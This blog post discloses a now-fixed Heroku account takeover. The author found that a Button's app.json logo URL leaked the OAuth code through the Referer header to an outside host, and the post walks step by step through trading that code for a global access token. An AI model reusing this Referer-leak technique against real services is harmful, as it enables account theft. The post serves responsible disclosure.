---
layout: post
title: "Taking over Heroku accounts"
---

_This is the first time I'm proud of a vulnerability I find._

> Prior to publishing this blog post, the team at Heroku fixed the vulnerability on 5/26, and it is no longer exploitable.

Context
======
<a href="https://www.heroku.com/" target="_blank">Heroku</a> has a feature called <a href="https://elements.heroku.com/buttons" target="_blank">Buttons</a>, which "let you one-click provision, configure and deploy third party components, libraries and pattern apps".
You can notice the button on Github like here: <a href="https://github.com/ParsePlatform/parse-server-example" target="_blank">https://github.com/ParsePlatform/parse-server-example</a>. In this case, when you click on <img src="https://www.herokucdn.com/deploy/button.svg" height="20">, you are redirected to <a href="https://dashboard.heroku.com/new?button-url=https%3A%2F%2Fgithub.com%2FParsePlatform%2Fparse-server-example&template=https%3A%2F%2Fgithub.com%2FParsePlatform%2Fparse-server-example" target="_blank">https://dashboard.heroku.com/new?button-url=https%3A%2F%2Fgithub.com%2FParsePlatform%2Fparse-server-example&template=https%3A%2F%2Fgithub.com%2FParsePlatform%2Fparse-server-example</a>.

Anyone can create a Button: <a href="https://devcenter.heroku.com/articles/heroku-button" target="_blank">https://devcenter.heroku.com/articles/heroku-button</a>. 

I created a Button <a href="https://github.com/esevece/heroku_test" target="_blank">https://github.com/esevece/heroku_test</a> that only includes the required file `app.json`. Because `app.json` is the file from where Heroku gets the information about the Button.

I tried injecting HTML attributes and tags in `app.json` to achieve XSS, but the special characters are being escaped in the client side (if you can do it, <a href="https://bugcrowd.com/heroku" target="_blank">report it!</a>). However, I noticed that I can set the URL of the `"logo"` to any value. This URL is used as the `src` of an `<img>` created when _https://dashboard.heroku.com/new_ is loaded.

When using `<img>`s the `Referer` header is sent with the URL that requested the image as the value, which allows the "image" to capture this URL in the server-side. I was only able to capture the `Referer` from a different domain using Firefox, Safari, Internet Explorer and Edge, but not using Chrome.

_More ways to leak HTTP requests: <a href="https://github.com/cure53/HTTPLeaks" target="_blank">https://github.com/cure53/HTTPLeaks</a>._

Vulnerability
======
What I had until now was that when I load <a href="https://dashboard.heroku.com/new?template=https%3A%2F%2Fgithub.com%2FParsePlatform%2Fparse-server-example&other_parameter=with_value" target="_blank">https://dashboard.heroku.com/new?template=https%3A%2F%2Fgithub.com%2FParsePlatform%2Fparse-server-example&other_parameter=with_value</a>, `<img src="https://avatars0.githubusercontent.com/u/1294580?v=3&amp;s=200" class="">` is created and the browser makes a request to <a href="https://avatars0.githubusercontent.com/u/1294580?v=3&amp;s=200" target="_blank">https://avatars0.githubusercontent.com/u/1294580?v=3&s=200</a> with the header `Referer: https://dashboard.heroku.com/new?template=https%3A%2F%2Fgithub.com%2FParsePlatform%2Fparse-server-example&other_parameter=with_value`. But I didn't have any critical parameter+value in the URL. 

I played with <a href="https://devcenter.heroku.com/articles/oauth" target="_blank">OAuth</a> and the applications owned by Heroku, with the intention to point the __redirect_uri__ to _https://dashboard.heroku.com/new?template=..._ -- where I could leak the `Referer` -- without success.

I don't remember when, but I noticed that a parameter __code__ is added to _https://dashboard.heroku.com/[path_requested]_ after authentication. The value of this parameter is sent to an endpoint which doesn't have <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" target="_blank">CSRF</a> protection and returns a JSON response including an `"access_token"` with "global" scope. This "global" scope allows you to do anything with the account using the <a href="https://api.heroku.com" target="_blank">API</a>! However I couldn't change the password or the email of the account, until... [to be continued :smile:]

Attack
======
Only worked if the user was already authenticated.

1. Send user to

        https://longboard.heroku.com/login?state=https%3A%2F%2Fdashboard.heroku.com%2Fnew%3Ftemplate%3Dhttps%253A%252F%252Fgithub.com%252Fesevece%252Fheroku_test

    ![1]({{ site.github.url }}/screenshots/2016-06-01-1.png)

2. User is redirected to 

        https://id.heroku.com/oauth/autorize?client_id=....
    
    ![2]({{ site.github.url }}/screenshots/2016-06-01-2.png)
    ![3]({{ site.github.url }}/screenshots/2016-06-01-3.png)

3. User is redirected to

        https://longboard.heroku.com/auth/heroku/callback?code=....

    ![4]({{ site.github.url }}/screenshots/2016-06-01-4.png)
    ![5]({{ site.github.url }}/screenshots/2016-06-01-5.png)

4. And finally, the user is redirected to

        https://dashboard.heroku.com/new?template=https%3A%2F%2Fgithub.com%2Fesevece%2Fheroku_test&code=...

    ![6]({{ site.github.url }}/screenshots/2016-06-01-6.png)
    ![7]({{ site.github.url }}/screenshots/2016-06-01-7.png)

5. Once the page loads, a request is made to the Github API to get the file __app.json__

        https://api.github.com/repos/esevece/heroku_test/contents/app.json?ref=master

    ![8]({{ site.github.url }}/screenshots/2016-06-01-8.png)
    ![9]({{ site.github.url }}/screenshots/2016-06-01-9.png)

6. The `<img src="https://u00f1.xyz/heroku/poc.php">` is created and the "image" is loaded, sending the __code__ in the `Referer`
    ![10]({{ site.github.url }}/screenshots/2016-06-01-10.png)

7. My file <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> captures the `Referer`, extracts the __code__ and makes a POST request to 

        https://longboard.heroku.com/login/token

    with the value of the parameter __password__ set to the value of __code__
    ![11]({{ site.github.url }}/screenshots/2016-06-01-11.png)

8. <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> takes the `"access_token"` from the last response and makes a GET request to 

        https://api.heroku.com/account

    with the header `Authorization:` set to `Bearer [the_access_token]`
    ![12]({{ site.github.url }}/screenshots/2016-06-01-12.png)

9. <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> takes the `"email"` from the last response and sends an email to the address
    ![13]({{ site.github.url }}/screenshots/2016-06-01-13.png)

Art Attack
======
After reporting the vulnerability to Heroku, <a href="https://twitter.com/ITSecurityguard" target="_blank">Patrik</a> from <a href="https://bugcrowd.com/" target="_blank">Bugcrowd</a> asked me to do whatever I could with his Heroku account. So, I started to look at what I could do and noticed that I couldn't change the email or password of his account. 

I kept looking for ways to really take over his account, until I decided to try to use his __access_token__ (that I had taken using the attack) as his password, and it worked! So, I changed his email.

Thanks
======
To <a href="https://www.heroku.com/" target="_blank">Heroku</a> for allow me to write about this vulnerability. 
To <a href="https://twitter.com/ITSecurityguard" target="_blank">Patrik</a> for push me to do something really bad with the bug.

_If something is not correct or well explained, let me know. Maybe is because of my ignorance, my poor English or because I missed something._
